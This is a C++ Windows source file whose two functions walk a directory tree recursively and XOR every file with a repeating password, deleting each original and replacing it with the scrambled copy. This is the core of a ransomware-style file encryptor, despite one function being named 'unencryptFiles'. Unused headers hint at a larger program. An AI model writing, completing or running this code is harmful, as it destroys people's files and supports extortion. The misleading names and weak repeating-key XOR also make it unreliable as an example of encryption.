
#include <windows.h>
#include <wincrypt.h>
#include <fstream>
#include <iostream>
#include <string>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <psapi.h>
#include <tchar.h>
#include <shlobj.h>
void sergxor(std::string key, std::string fileName)
{
    std::ifstream inFile(fileName, std::ios::binary);
    std::ofstream outFile("temp", std::ios::binary);
    std::string in((std::istreambuf_iterator<char>(inFile)), (std::istreambuf_iterator<char>()));

    for (size_t i = 0; i < in.size(); ++i)
    {
        in[i] ^= key[i % key.size()];
    }

    outFile << in;
    inFile.close();
    outFile.close();

    if (!std::ifstream("temp"))
    {
        std::cerr << "Failed to encrypt file: " << fileName << std::endl;
    }
    else
    {
        remove(fileName.c_str());
        rename("temp", fileName.c_str());
        std::cout << "Encrypted file: " << fileName << std::endl;
    }
}

void unencryptFiles(const std::string& directoryPath, const std::string& password)
{
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;

    std::string path = directoryPath + "\\*";

    hFind = FindFirstFile(path.c_str(), &findFileData);
    if (hFind == INVALID_HANDLE_VALUE)
    {
        std::cout << "FindFirstFile failed with error " << GetLastError();
        return;
    }
    else
    {
        do
        {
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0)
                {
                    std::string newPath = directoryPath + "\\" + findFileData.cFileName;
                    unencryptFiles(newPath, password);
                }
            }
            else
            {
                std::string filePath = directoryPath + "\\" + findFileData.cFileName;
                sergxor(password, filePath);
            }
        } while (FindNextFile(hFind, &findFileData) != 0);
    }
    FindClose(hFind);
}

